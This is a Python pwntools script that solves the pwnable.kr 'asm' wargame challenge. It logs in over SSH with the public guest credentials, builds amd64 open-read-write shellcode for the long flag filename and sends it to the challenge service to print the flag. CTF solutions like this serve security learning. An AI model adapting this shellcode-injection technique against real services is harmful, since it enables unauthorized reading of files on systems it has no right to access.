from pwn import *

context(arch="amd64", os="linux", endian="little")

flag = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

len_flag = len(flag)

s = ssh("asm", "pwnable.kr", password="guest", port=2222)
r = s.remote("0", 9026)

shellcode = asm(
    shellcraft.open(flag) +
    shellcraft.read("rax", "rsp", len_flag) +
    shellcraft.write(1, "rsp", len_flag) +
    shellcraft.exit(0)
)

r.recvuntil(b'shellcode: ')
r.send(shellcode)

log.success(f"Flag: {r.recvline().decode()}")
